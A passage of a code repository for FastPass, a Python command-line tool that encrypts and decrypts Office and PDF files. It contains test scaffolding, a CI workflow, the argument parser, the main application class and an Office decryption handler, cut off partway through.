        """
```

---

## Performance and Stress Tests

### **J. Performance Validation Tests** (`test_large_files.py`, `test_batch_performance.py`)

```python
class TestPerformanceValidation:
    """Test performance requirements and limits"""
    
    # J1: Large File Performance Tests
    def test_large_pdf_processing_performance(self):
        """
        Test: Process 100MB PDF file
        - Requirement: Complete within 30 seconds
        - Verify: Memory usage stays within reasonable limits
        """
        
    def test_large_office_document_performance(self):
        """
        Test: Process 50MB Office document
        - Requirement: Complete within 20 seconds
        - Verify: Temporary file cleanup within 5 seconds
        """
    
    # J2: Batch Processing Performance Tests
    def test_batch_processing_100_files(self):
        """
        Test: Process 100 small files in batch
        - Requirement: All files processed within 60 seconds
        - Verify: Memory usage scales linearly
        """
        
    def test_concurrent_file_processing(self):
        """
        Test: Multiple FastPass instances running simultaneously
        - Run 5 FastPass processes concurrently
        - Verify: No file corruption or interference
        """
    
    # J3: Memory Usage Tests
    def test_memory_usage_large_batches(self):
        """
        Test: Memory usage with large file batches
        - Process 50 files of 10MB each
        - Verify: Memory usage < 1GB total
        - Verify: Memory released after each file
        """
        
    def test_memory_leak_detection(self):
        """
        Test: Detect memory leaks in long-running operations
        - Process 1000 small files sequentially
        - Monitor memory usage throughout
        - Verify: No continuous memory growth
        """
```

---

## Test Execution Framework

### **Test Configuration** (`conftest.py`)

```python
"""PyTest configuration and shared fixtures"""

import pytest
import tempfile
import shutil
from pathlib import Path
import subprocess
import os

@pytest.fixture(scope="session")
def test_data_dir():
    """Fixture providing test data directory"""
    return Path(__file__).parent / "fixtures"

@pytest.fixture(scope="session") 
def sample_files_dir(test_data_dir):
    """Fixture providing sample files directory"""
    return test_data_dir / "sample_files"

@pytest.fixture
def temp_work_dir():
    """Fixture providing temporary working directory for each test"""
    temp_dir = tempfile.mkdtemp(prefix="fastpass_test_")
    yield Path(temp_dir)
    shutil.rmtree(temp_dir, ignore_errors=True)

@pytest.fixture
def fastpass_executable():
    """Fixture providing path to FastPass executable"""
    # Assuming FastPass is installed or available in PATH
    return "fast_pass"

@pytest.fixture 
def encrypted_test_files(sample_files_dir, temp_work_dir):
    """Fixture providing pre-encrypted test files"""
    # Copy sample files to temp directory and encrypt them
    encrypted_files = {}
    
    sample_file = sample_files_dir / "clean" / "sample.docx"
    encrypted_file = temp_work_dir / "sample_encrypted.docx"
    
    # Use subprocess to encrypt with known password
    subprocess.run([
        "fast_pass", "encrypt", 
        "-i", str(sample_file),
        "-p", "test123",
        "--output", str(encrypted_file)
    ], check=True)
    
    encrypted_files["docx"] = {
        "file": encrypted_file,
        "password": "test123"
    }
    
    return encrypted_files

@pytest.fixture
def password_list_file(temp_work_dir):
    """Fixture providing password list file"""
    password_file = temp_work_dir / "passwords.txt"
    passwords = [
        "password123",
        "secret456", 
        "complex&password!",
        "test with spaces",
        "паролъ123"  # Unicode password
    ]
    
    with open(password_file, 'w', encoding='utf-8') as f:
        for password in passwords:
            f.write(f"{password}\n")
    
    return password_file

# Performance test markers
pytest.mark.performance = pytest.mark.mark("performance", "Performance tests")
pytest.mark.security = pytest.mark.mark("security", "Security tests")  
pytest.mark.e2e = pytest.mark.mark("e2e", "End-to-end tests")
pytest.mark.integration = pytest.mark.mark("integration", "Integration tests")
```

### **Test Execution Script** (`test_runner.py`)

```python
#!/usr/bin/env python3
"""
FastPass Test Runner
Executes comprehensive test suite with reporting
"""

import subprocess
import sys
import time
from pathlib import Path

def run_test_suite():
    """Run complete test suite with coverage reporting"""
    
    print("🚀 Starting FastPass Comprehensive Test Suite")
    print("=" * 60)
    
    start_time = time.time()
    
    # Test execution order
    test_phases = [
        ("Unit Tests", "tests/unit/"),
        ("Integration Tests", "tests/integration/"), 
        ("End-to-End Tests", "tests/e2e/"),
        ("Security Tests", "tests/security/"),
        ("Performance Tests", "tests/performance/")
    ]
    
    total_results = {
        "passed": 0,
        "failed": 0,
        "skipped": 0
    }
    
    for phase_name, test_dir in test_phases:
        print(f"\n📋 Running {phase_name}")
        print("-" * 40)
        
        cmd = [
            "python", "-m", "pytest",
            test_dir,
            "-v",
            "--tb=short", 
            "--cov=fastpass",
            "--cov-report=html:reports/coverage/",
            "--junit-xml=reports/junit.xml",
            "--html=reports/test_report.html"
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"✅ {phase_name} PASSED")
            else:
                print(f"❌ {phase_name} FAILED")
                print(result.stdout)
                print(result.stderr)
                
        except Exception as e:
            print(f"💥 {phase_name} ERROR: {e}")
    
    end_time = time.time()
    duration = end_time - start_time
    
    print(f"\n🏁 Test Suite Complete")
    print(f"⏱️  Total Duration: {duration:.2f} seconds")
    print(f"📊 Coverage Report: reports/coverage/index.html")
    print(f"📋 Test Report: reports/test_report.html")

if __name__ == "__main__":
    run_test_suite()
```

---

## Test Data Management

### **Sample File Creation Script** (`fixtures/create_sample_files.py`)

```python
#!/usr/bin/env python3
"""
Create comprehensive sample files for testing
"""

import os
from pathlib import Path
import shutil
from docx import Document
import openpyxl
from pptx import Presentation
from reportlab.pdfgen import canvas

def create_sample_files():
    """Create all required sample files for testing"""
    
    fixtures_dir = Path(__file__).parent
    clean_dir = fixtures_dir / "sample_files" / "clean"
    clean_dir.mkdir(parents=True, exist_ok=True)
    
    # Create sample DOCX
    doc = Document()
    doc.add_heading('Test Document', 0)
    doc.add_paragraph('This is a test document for FastPass testing.')
    doc.add_paragraph('It contains multiple paragraphs for validation.')
    doc.save(clean_dir / "sample.docx")
    
    # Create sample XLSX
    wb = openpyxl.Workbook()
    ws = wb.active
    ws['A1'] = 'Test Data'
    ws['A2'] = 'Value 1'
    ws['A3'] = 'Value 2'
    wb.save(clean_dir / "sample.xlsx")
    
    # Create sample PPTX
    prs = Presentation()
    slide = prs.slides.add_slide(prs.slide_layouts[0])
    title = slide.shapes.title
    subtitle = slide.placeholders[1]
    title.text = "Test Presentation"
    subtitle.text = "FastPass Testing Sample"
    prs.save(clean_dir / "sample.pptx")
    
    # Create sample PDF
    pdf_path = clean_dir / "sample.pdf"
    c = canvas.Canvas(str(pdf_path))
    c.drawString(100, 750, "Test PDF Document")
    c.drawString(100, 730, "This is a sample PDF for FastPass testing.")
    c.save()
    
    print("✅ Sample files created successfully")

if __name__ == "__main__":
    create_sample_files()
```

---

## Test Quality Assurance

### **Test Coverage Requirements**

- **Minimum Code Coverage**: 95% line coverage
- **Branch Coverage**: 90% branch coverage  
- **Function Coverage**: 100% function coverage
- **Security Test Coverage**: 100% of attack vectors tested

### **Test Performance Requirements**

- **Unit Tests**: All unit tests complete within 30 seconds
- **Integration Tests**: All integration tests complete within 2 minutes
- **End-to-End Tests**: All E2E tests complete within 10 minutes
- **Full Suite**: Complete test suite finishes within 15 minutes

### **Test Data Requirements**

- **Sample Files**: Representative files for each supported format
- **Encrypted Files**: Pre-encrypted files with known passwords
- **Malicious Files**: Security test files for attack simulation
- **Edge Case Files**: Files testing format limits and edge cases

### **Continuous Integration Integration**

```yaml
# .github/workflows/test.yml
name: FastPass Test Suite

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v2
    
    - name: Set up Python
      uses: actions/setup-python@v2
      with:
        python-version: '3.9'
    
    - name: Install dependencies
      run: |
        pip install -r requirements.txt
        pip install -r tests/requirements.txt
    
    - name: Run test suite
      run: python tests/test_runner.py
    
    - name: Upload coverage reports
      uses: codecov/codecov-action@v1
```

---

## Summary

This comprehensive test design provides **exhaustive coverage** of the FastPass application:

**✅ Complete Coverage**:
- Every CLI argument combination
- Every security hardening feature  
- Every file format and validation scenario
- Every password handling method
- Every crypto tool integration
- Every error condition and recovery scenario

**✅ Real-World Testing**:
- Actual file encryption/decryption operations
- Multi-file batch processing scenarios
- Complex password list workflows
- Performance validation with large files
- Security attack simulation with real payloads

**✅ Automated Execution**:
- Pytest framework with comprehensive fixtures
- Automated test data generation
- Performance monitoring and reporting
- Coverage analysis and reporting
- CI/CD integration ready

**✅ Quality Assurance**:
- 95% minimum code coverage requirement
- All tests complete within 15 minutes
- Comprehensive error scenario testing
- Security attack vector validation

The test suite ensures FastPass reliability, security, and performance meet enterprise-grade standards while maintaining rapid automated execution for continuous integration.
</file>

<file path="main.py">
#!/usr/bin/env python3
"""
Main application entry point
"""

import sys
from pathlib import Path

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent / "src"))

def main():
    """Main function"""
    print("Hello from your new Python project!")
    print(f"Project root: {Path(__file__).parent}")
    
    # Your application logic goes here
    pass

if __name__ == "__main__":
    main()
</file>

<file path="scripts/create_test_pdf.py">
#!/usr/bin/env python3
"""
Create a simple test PDF file for FastPass testing
"""

try:
    from reportlab.pdfgen import canvas
    from reportlab.lib.pagesizes import letter
    import sys
    from pathlib import Path
    
    def create_test_pdf(output_path: str):
        """Create a simple test PDF"""
        c = canvas.Canvas(output_path, pagesize=letter)
        
        # Add some content
        c.drawString(100, 750, "FastPass Test Document")
        c.drawString(100, 720, "This is a test PDF for FastPass encryption/decryption testing.")
        c.drawString(100, 690, "Created for testing purposes only.")
        
        # Add a second page
        c.showPage()
        c.drawString(100, 750, "Page 2 of Test Document")
        c.drawString(100, 720, "Additional content for testing multi-page PDFs.")
        
        c.save()
        print(f"Test PDF created: {output_path}")
    
    if __name__ == "__main__":
        output_file = Path(__file__).parent.parent / "test_sample.pdf"
        create_test_pdf(str(output_file))
        
except ImportError:
    # Fallback: create a minimal PDF manually
    import sys
    from pathlib import Path
    
    def create_minimal_pdf(output_path: str):
        """Create minimal PDF without reportlab"""
        # Very basic PDF structure
        pdf_content = """%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj

4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(FastPass Test PDF) Tj
ET
endstream
endobj

xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000216 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
310
%%EOF"""
        
        with open(output_path, 'w') as f:
            f.write(pdf_content)
        print(f"Minimal test PDF created: {output_path}")
    
    if __name__ == "__main__":
        output_file = Path(__file__).parent.parent / "test_sample.pdf"
        create_minimal_pdf(str(output_file))
</file>

<file path="src/__main__.py">
#!/usr/bin/env python3
"""
FastPass - Universal File Encryption/Decryption Tool

Makes package executable with 'python -m src'
Entry point: MAIN PROGRAM ENTRY POINT
"""

# A1a: Load System Tools
import sys
import os
from pathlib import Path

# Add src directory to path for imports
src_path = Path(__file__).parent
if str(src_path) not in sys.path:
    sys.path.insert(0, str(src_path))

def main():
    """FastPass main entry point with complete error handling"""
    from cli import main as cli_main
    return cli_main()

if __name__ == "__main__":
    # Program Startup - FastPass application begins execution
    sys.exit(main())
</file>

<file path="src/app.py">
"""
FastPass Main Application
Maps to: A5a-A5g FastPass Application Initialization and main processing flow
"""

# A1a: Load System Tools
import sys
import atexit
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, List
import logging

from utils.config import FastPassConfig
from utils.logger import sanitize_error_message


class FastPassApplication:
    """
    A5a: Create FastPassApplication Class
    Main application class that orchestrates the entire FastPass workflow
    """
    
    def __init__(self, args, logger: logging.Logger, config: Dict[str, Any]):
        """
        A5b: Initialize Instance Variables
        Store command-line arguments, logger, and configuration
        """
        self.args = args
        self.logger = logger
        self.config = config
        
        # A5c: Initialize Tracking Lists
        self.temp_files_created = []
        self.processing_results = {}
        
        # A5d: Record Operation Start Time
        self.operation_start_time = datetime.now()
        
        # A5e: Initialize Password Manager
        from core.password.password_manager import PasswordManager
        self.password_manager = PasswordManager(
            cli_passwords=getattr(args, 'password', []) or [],
            password_list_file=getattr(args, 'password_list', None),
            stdin_mapping=getattr(args, 'stdin_password_mapping', None)
        )
        
        # A5f: Set Application State Flags
        self.ready_for_processing = True
        self.cleanup_required = True
        
        # A5g: Log Application Initialized
        self.logger.debug('FastPass application initialized')
        
        # Register cleanup handler
        atexit.register(self._emergency_cleanup)
    
    def run(self) -> int:
        """
        Main execution flow following the complete flowchart
        Returns exit code (0=success, 1=error, 2=invalid args, 3=security, 4=password)
        """
        try:
            # A4a-A4e: Crypto Tool Detection
            self._check_crypto_tools()
            
            # Section B: Security & File Validation
            validated_files = self._perform_security_and_file_validation()
            
            # Section C: Crypto Tool Setup & Configuration
            crypto_handlers = self._setup_crypto_tools_and_configuration(validated_files)
            
            # Section D: File Processing & Operations
            processing_results = self._process_files_with_crypto_operations(
                validated_files, crypto_handlers
            )
            
            # Section E: Cleanup & Results Reporting
            exit_code = self._cleanup_and_generate_final_report(processing_results)
            
            return exit_code
            
        except SecurityViolationError as e:
            self.logger.error(f"Security violation: {sanitize_error_message(str(e))}")
            return 3
        except FileFormatError as e:
            self.logger.error(f"File format error: {sanitize_error_message(str(e))}")
            return 1
        except CryptoToolError as e:
            self.logger.error(f"Crypto tool error: {sanitize_error_message(str(e))}")
            return 1
        except PasswordError as e:
            self.logger.error(f"Password error: {sanitize_error_message(str(e))}")
            return 4
        except ProcessingError as e:
            self.logger.error(f"Processing error: {sanitize_error_message(str(e))}")
            self._cleanup_partial_processing_on_failure()
            return 1
        except Exception as e:
            self.logger.error(f"Unexpected error: {sanitize_error_message(str(e))}")
            self._emergency_cleanup()
            return 2
    
    def _check_crypto_tools(self) -> None:
        """
        A4a-A4e: Crypto Tool Detection
        Check if all required crypto tools are available
        """
        # A4a: Load Encryption Tool Support
        crypto_tools = {}
        missing_tools = []
        
        # A4b: Check Office Document Tool
        try:
            import msoffcrypto
            crypto_tools['msoffcrypto'] = True
            self.logger.debug("Office document tool available")
        except ImportError:
            missing_tools.append('msoffcrypto-tool')
            self.logger.warning("msoffcrypto-tool not available")
        
        # A4c: Check PDF Processing Tool
        try:
            import PyPDF2
            crypto_tools['PyPDF2'] = True
            self.logger.debug("PDF processing tool available")
        except ImportError:
            missing_tools.append('PyPDF2')
            self.logger.warning("PyPDF2 not available")
        
        # A4e: Validate All Tools Present
        if missing_tools:
            raise CryptoToolError(f"Missing required tools: {missing_tools}")
        
        self.crypto_tools = crypto_tools
    
    def _perform_security_and_file_validation(self) -> List:
        """
        Section B: Security & File Validation
        Perform comprehensive security checks and file validation
        """
        from core.security import SecurityValidator
        from core.file_handler import FileValidator
        
        # B1a-B1c: Initialize and determine files to process
        security_validator = SecurityValidator(self.logger)
        file_validator = FileValidator(self.logger, self.config)
        
        # Determine input files
        if hasattr(self.args, 'input') and self.args.input:
            files_to_process = self.args.input
        elif hasattr(self.args, 'recursive') and self.args.recursive:
            files_to_process = self._collect_files_recursively(self.args.recursive)
        else:
            raise ValueError("No input files specified")
        
        validated_files = []
        
        # Process each file
        for file_path in files_to_process:
            try:
                # B1e-B2e: Security validation
                security_validator.validate_file_path(file_path)
                
                # B3a-B5c: File format and content validation
                file_manifest = file_validator.validate_file(file_path)
                
                validated_files.append(file_manifest)
                
            except (SecurityViolationError, FileFormatError) as e:
                self.logger.error(f"Validation failed for {file_path}: {e}")
                # Continue with other files
        
        if not validated_files:
            raise FileFormatError("No valid files found to process")
        
        self.logger.info(f"Validated {len(validated_files)} files for processing")
        return validated_files
    
    def _collect_files_recursively(self, directory: Path) -> List[Path]:
        """
        B1c_Recursive: Collect Files Recursively
        Walk directory tree for supported formats
        """
        files = []
        try:
            for pattern in FastPassConfig.SUPPORTED_FORMATS.keys():
                files.extend(directory.rglob(f"*{pattern}"))
        except Exception as e:
            raise FileFormatError(f"Error collecting files from {directory}: {e}")
        
        return files
    
    def _setup_crypto_tools_and_configuration(self, validated_files: List) -> Dict:
        """
        Section C: Crypto Tool Setup & Configuration
        Initialize and configure crypto handlers
        """
        from core.crypto_handlers.office_handler import OfficeDocumentHandler
        from core.crypto_handlers.pdf_handler import PDFHandler
        
        # C1a-C1d: Analyze required tools and initialize handlers
        required_tools = set(manifest.crypto_tool for manifest in validated_files)
        crypto_handlers = {}
        
        if 'msoffcrypto' in required_tools:
            crypto_handlers['msoffcrypto'] = OfficeDocumentHandler(self.logger)
        
        if 'PyPDF2' in required_tools:
            crypto_handlers['PyPDF2'] = PDFHandler(self.logger)
        
        # C2a-C2b: Configure handlers
        for handler in crypto_handlers.values():
            handler.configure(self.config)
        
        self.logger.debug(f"Initialized {len(crypto_handlers)} crypto handlers")
        return crypto_handlers
    
    def _process_files_with_crypto_operations(self, validated_files: List, crypto_handlers: Dict) -> Dict:
        """
        Section D: File Processing & Operations
        Process files with crypto operations
        """
        from core.file_handler import FileProcessor
        
        processor = FileProcessor(
            logger=self.logger,
            config=self.config,
            password_manager=self.password_manager,
            crypto_handlers=crypto_handlers,
            temp_files_created=self.temp_files_created
        )
        
        return processor.process_files(validated_files, self.args.operation, self.args.output_dir)
    
    def _cleanup_and_generate_final_report(self, processing_results: Dict) -> int:
        """
        Section E: Cleanup & Results Reporting
        Generate reports and determine exit code
        """
        from core.file_handler import ResultsReporter
        
        # E1a-E1e: Calculate processing metrics
        reporter = ResultsReporter(self.logger, self.operation_start_time)
        
        # E2a-E2f: Enhanced cleanup
        self._perform_cleanup()
        
        # E3a-E3d: Sensitive data clearing
        self._clear_sensitive_data()
        
        # E4a-E5d: Report generation and exit code determination
        return reporter.generate_report(processing_results)
    
    def _perform_cleanup(self) -> None:
        """
        E2a-E2f: Enhanced Cleanup with Retry and Secure Deletion
        Clean up temporary files and directories
        """
        for temp_file in self.temp_files_created:
            try:
                if temp_file.exists():
                    temp_file.unlink()
                    self.logger.debug(f"Cleaned up temp file: {temp_file}")
            except Exception as e:
                self.logger.warning(f"Failed to remove temp file {temp_file}: {e}")
    
    def _clear_sensitive_data(self) -> None:
        """
        E3a-E3d: Enhanced Sensitive Data Clearing
        Clear passwords and sensitive data from memory
        """
        # Clear password manager
        if hasattr(self, 'password_manager'):
            self.password_manager.clear_passwords()
            del self.password_manager
        
        # Clear CLI arguments containing passwords
        if hasattr(self.args, 'password'):
            self.args.password = None
        
        # Force garbage collection
        import gc
        gc.collect()
    
    def _cleanup_partial_processing_on_failure(self) -> None:
        """Cleanup when processing fails partway through"""
        self._perform_cleanup()
    
    def _emergency_cleanup(self) -> None:
        """Emergency cleanup for unexpected termination"""
        try:
            self._perform_cleanup()
        except Exception:
            pass  # Ignore errors during emergency cleanup


# Custom Exception Classes
class SecurityViolationError(Exception):
    """Raised when security validation fails"""
    pass

class FileFormatError(Exception):
    """Raised when file format validation fails"""
    pass

class CryptoToolError(Exception):
    """Raised when crypto tools are unavailable"""
    pass

class PasswordError(Exception):
    """Raised when password operations fail"""
    pass

class ProcessingError(Exception):
    """Raised when file processing fails"""
    pass
</file>

<file path="src/cli.py">
"""
FastPass CLI Argument Parsing and Validation
Maps to: Section A - DETAILED CLI PARSING from flowchart
"""

# A1a: Load System Tools
import argparse
import sys
import json
from pathlib import Path
from typing import List, Optional, Dict, Any

from utils.config import FastPassConfig
from utils.logger import setup_logger, sanitize_error_message


def parse_command_line_arguments() -> argparse.Namespace:
    """
    A1b: Initialize Command Reader
    Create a system to understand user commands
    Set up FastPass name and help description
    """
    parser = argparse.ArgumentParser(
        prog="fast_pass",
        description="FastPass - Universal file encryption and decryption tool",
        epilog="""
Examples:
  fast_pass encrypt -i contract.docx -p "mypassword"
  fast_pass decrypt -i file1.pdf file2.docx -p "shared_pwd"
  fast_pass decrypt -r ./encrypted_docs/ -p "main_password"
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    # A1g: Add Helper Features with Enhanced Logging  
    parser.add_argument(
        '--list-supported',
        action='store_true',
        help='List supported file formats'
    )
    
    parser.add_argument(
        '--version',
        action='version',
        version=f'FastPass {FastPassConfig.VERSION}'
    )
    
    # A1c: Define Main Operation Choice
    # User must choose either encrypt OR decrypt
    # Cannot do both operations simultaneously
    subparsers = parser.add_subparsers(dest='operation', help='Operation to perform')
    subparsers.required = False  # Allow for info commands
    
    # Encrypt operation
    encrypt_parser = subparsers.add_parser('encrypt', help='Add password protection to files')
    setup_common_arguments(encrypt_parser)
    
    # Decrypt operation  
    decrypt_parser = subparsers.add_parser('decrypt', help='Remove password protection from files')
    setup_common_arguments(decrypt_parser)
    
    # Add recursive option to decrypt and check-password only
    decrypt_parser.add_argument(
        '-r', '--recursive',
        type=Path,
        help='Process directory recursively (decrypt/check-password only)'
    )
    
    # Check password operation
    check_parser = subparsers.add_parser('check-password', help='Check if files require passwords')
    setup_common_arguments(check_parser)
    check_parser.add_argument(
        '-r', '--recursive',
        type=Path,
        help='Process directory recursively'
    )
    
    # Note: encrypt parser deliberately does not have -r option for security
    
    
    return parser.parse_args()


def setup_common_arguments(parser: argparse.ArgumentParser) -> None:
    """Setup arguments common to all operations"""
    
    # A1d: Set Up File Input Options
    # Use -i/--input flag for space-delimited files
    # Require explicit file specification with quotes for spaced paths
    parser.add_argument(
        '-i', '--input',
        nargs='+',
        type=Path,
        help='Files to process (space-delimited, quotes for spaces)'
    )
    
    # A1e: Configure Password Options with Space Delimitation
    # Accept space-delimited passwords with -p flag
    # Support password file and JSON stdin options
    parser.add_argument(
        '-p', '--password',
        nargs='+',
        help='Passwords to try (space-delimited, quotes for spaces, or "stdin" for JSON)'
    )
    
    parser.add_argument(
        '--password-list',
        type=Path,
        help='Text file with passwords to try (one per line)'
    )
    
    # A1f: Set Output Location Options
    # Choose where processed files should be saved
    # Default: replace original files in same location
    parser.add_argument(
        '-o', '--output-dir',
        type=Path,
        help='Output directory (default: in-place modification)'
    )
    
    # A1g: Add Helper Features
    parser.add_argument(
        '--dry-run',
        action='store_true',
        help='Show what would be done without making changes'
    )
    
    parser.add_argument(
        '--verify',
        action='store_true',
        help='Deep verification of processed files'
    )
    
    parser.add_argument(
        '--debug',
        action='store_true',
        help='Enable detailed logging and debug output'
    )
    
    parser.add_argument(
        '--log-file',
        type=Path,
        help='Log file path for detailed logging'
    )


def display_information_and_exit(args: argparse.Namespace) -> int:
    """
    A1i: Handle Information Requests
    Check if user wants to see supported file formats
    Show list and exit if that's all they wanted
    """
    if getattr(args, 'list_supported', False):
        # A1i_List: Show Supported File Types
        print("FastPass Supported File Formats:")
        print("\nModern Office Documents (experimental encryption, full decryption):")
        office_formats = [ext for ext, tool in FastPassConfig.SUPPORTED_FORMATS.items() 
                         if tool == 'msoffcrypto']
        for fmt in sorted(office_formats):
            print(f"  {fmt}")
        
        print("\nPDF Documents (full encryption and decryption support):")
        pdf_formats = [ext for ext, tool in FastPassConfig.SUPPORTED_FORMATS.items() 
                      if tool == 'PyPDF2']
        for fmt in sorted(pdf_formats):
            print(f"  {fmt}")
        
        print("\nLegacy Office Formats (NOT SUPPORTED):")
        print("  .doc, .xls, .ppt (use Office to convert to modern format)")
        
        return 0
    
    return 0


def validate_arguments(args: argparse.Namespace) -> None:
    """
    A2a: Check Input Requirements
    User must specify either files or folder to process
    Cannot proceed without something to work on
    """
    
    # Skip validation for info commands
    if getattr(args, 'list_supported', False):
        return
    
    # Must have an operation for non-info commands
    if not args.operation:
        raise ValueError("Must specify an operation (encrypt, decrypt, or check-password)")
    
    # A2a_Check: Valid Input Method Provided?
    has_files = hasattr(args, 'input') and args.input
    has_recursive = hasattr(args, 'recursive') and args.recursive
    
    if not has_files and not has_recursive:
        # A2a_Error: Nothing to Process
        raise ValueError("Must specify either files (-i) or recursive directory (-r)")
    
    if has_files and has_recursive:
        # A2a_Both_Error: Conflicting Instructions
        raise ValueError("Cannot specify both individual files and recursive directory")
    
    # A2a1: Validate Recursive Mode Usage
    # Check if recursive mode used with encrypt operation
    # Recursive mode only allowed with decrypt/check-password
    if has_recursive and args.operation == 'encrypt':
        # A2a1_Error: Recursive Encryption Blocked
        raise ValueError("Recursive mode only supported for decrypt operations (security restriction)")
    
    # Validate password requirements
    has_passwords = (hasattr(args, 'password') and args.password) or \
                   (hasattr(args, 'password_list') and args.password_list)
    
    if not has_passwords and args.operation != 'check-password':
        raise ValueError("Must specify passwords (-p) or password list (--password-list)")


def handle_stdin_passwords(args: argparse.Namespace) -> None:
    """
    A3d: Handle Stdin Password Input
    Check for 'stdin' in CLI passwords
    Parse JSON password mapping from stdin if specified
    """
    if hasattr(args, 'password') and args.password and 'stdin' in args.password:
        try:
            # Read JSON from stdin
            stdin_data = sys.stdin.read().strip()
            if stdin_data:
                password_mapping = json.loads(stdin_data)
                # Store the mapping for later use
                args.stdin_password_mapping = password_mapping
                # Remove 'stdin' from password list
                args.password = [p for p in args.password if p != 'stdin']
        except json.JSONDecodeError as e:
            raise ValueError(f"Invalid JSON in stdin: {e}")
        except Exception as e:
            raise ValueError(f"Error reading passwords from stdin: {e}")


def main() -> int:
    """
    Main Control Center
    Sets up error handling for entire program
    Prepares to read user's command-line instructions
    """
    try:
        # A1h: Read User's Commands
        # Process the command-line instructions user provided
        # Handle cases where user asks for help or makes errors
        args = parse_command_line_arguments()
        
        # A1i: Handle Information Requests
        if hasattr(args, 'list_supported') and args.list_supported:
            return display_information_and_exit(args)
        
        # A3a-A3e: Enhanced Logging Setup
        logger = setup_logger(
            debug=getattr(args, 'debug', False),
            log_file=getattr(args, 'log_file', None)
        )
        
        # A3e: Record Program Startup with Config
        logger.info(f"FastPass v{FastPassConfig.VERSION} starting")
        logger.debug(f"Operation: {args.operation}")
        
        # Validate arguments
        validate_arguments(args)
        
        # Handle stdin passwords
        handle_stdin_passwords(args)
        
        # Load configuration
        config = FastPassConfig.load_configuration(args)
        logger.debug(f"Configuration loaded: {len(config)} settings")
        
        # Import and run main application
        from app import FastPassApplication
        app = FastPassApplication(args, logger, config)
        return app.run()
        
    except ValueError as e:
        # A1h_Error: Invalid User Input
        print(f"Error: {sanitize_error_message(str(e))}", file=sys.stderr)
        return 2
    except KeyboardInterrupt:
        print("\nOperation cancelled by user", file=sys.stderr)
        return 1
    except Exception as e:
        # Unexpected error
        print(f"Unexpected error: {sanitize_error_message(str(e))}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
</file>

<file path="src/core/__init__.py">
"""
FastPass Core Business Logic
"""

from .security import SecurityValidator
from .file_handler import FileValidator, FileProcessor, ResultsReporter

__all__ = ['SecurityValidator', 'FileValidator', 'FileProcessor', 'ResultsReporter']
</file>

<file path="src/core/crypto_handlers/__init__.py">
"""
FastPass Crypto Tool Integrations
"""

from .office_handler import OfficeDocumentHandler
from .pdf_handler import PDFHandler

__all__ = ['OfficeDocumentHandler', 'PDFHandler']
</file>

<file path="src/core/crypto_handlers/office_handler.py">
"""
FastPass Office Document Handler
Maps to: C1c_Office, C2a_Config - msoffcrypto-tool integration
"""

# A1a: Load System Tools
import logging
from pathlib import Path
from typing import Dict, Any
import tempfile
import shutil

try:
    import msoffcrypto
except ImportError:
    msoffcrypto = None


class OfficeDocumentHandler:
    """
    Microsoft Office document encryption/decryption handler
    Uses msoffcrypto-tool for crypto operations
    """
    
    def __init__(self, logger: logging.Logger):
        self.logger = logger
        
        if msoffcrypto is None:
            raise ImportError("msoffcrypto-tool is required for Office document processing")
        
        # C2a_Config: Configure Office Settings
        self.timeout = 30
        self.encryption_algorithm = 'AES-256'
        
        self.logger.debug("Office document handler initialized")
    
    def configure(self, config: Dict[str, Any]) -> None:
        """
        C2a: Configure Office Handler
        Set Office-specific configuration options
        """
        self.timeout = config.get('office_timeout', self.timeout)
        
        # Log experimental encryption warning
        if config.get('debug', False):
            self.logger.warning(
                "Office document encryption is EXPERIMENTAL. "
                "Decryption is fully supported."
            )
    
    def test_password(self, file_path: Path, password: str) -> bool:
        """
        Test if password works for Office document
        Returns True if password is correct, False otherwise
        """
        try:
            with open(file_path, 'rb') as f:
                office_file = msoffcrypto.OfficeFile(f)
                
                if not office_file.is_encrypted():
                    # File is not encrypted, so any password "works" for decryption
                    return True
                
                # Try to load with password
                office_file.load_key(password=password)
                
                # Try to decrypt a small portion to verify password
                with tempfile.NamedTemporaryFile() as temp_file:
                    office_file.decrypt(temp_file)
                    temp_file.seek(0)
                    # If we can read some data, password is correct
                    data = temp_file.read(100)
                    return len(data) > 0
                    
        except Exception as e:
            self.logger.debug(f"Password test failed for {file_path}: {e}")
            return False
    
    def encrypt_file(self, input_path: Path, output_path: Path, password: str) -> None:
        """
        Encrypt Office document with password
        Note: This is experimental functionality
        """
        
        # Log experimental warning
        self.logger.warning(
            f"EXPERIMENTAL: Encrypting {input_path.name} with Office encryption"
        )
        
        try:
            # For Office encryption, we need to use a different approach
            # msoffcrypto-tool primarily supports decryption
            # For encryption, we would need to use Office automation or other tools
            
            # This is a placeholder implementation
            # In a real implementation, you might use:
            # - Office COM automation (Windows only)
            # - LibreOffice command line tools
            # - Or other encryption methods
            
            raise NotImplementedError(
                "Office document encryption is not yet implemented. "
                "Use Microsoft Office or LibreOffice to encrypt documents manually."
            )
            
        except Exception as e:
            raise Exception(f"Failed to encrypt Office document {input_path}: {e}")
    
    def decrypt_file(self, input_path: Path, output_path: Path, password: str) -> None:
        """
        Decrypt Office document with password
        Full decryption support using msoffcrypto-tool
        """
        try:
            with open(input_path, 'rb') as f:
                office_file = msoffcrypto.OfficeFile(f)
                
                if not office_file.is_encrypted():
                    # File is not encrypted, just copy it
                    shutil.copy2(input_path, output_path)
                    self.logger.info(f"File {input_path.name} was not encrypted, copied as-is")
                    return
                
                # Load the password
                office_file.load_key(password=password)
                
                # Decrypt to output file
                with open(output_path, 'wb') as output_file:
                    office_file.decrypt(output_file)
                
                self.logger.info(f"Successfully decrypted {input_path.name}")
                
        except Exception as e:
            raise Exception(f"Failed to decrypt Office document {input_path}: {e}")
    
    def cleanup(self) -> None:
        """
        E2d: Call Handler Cleanup
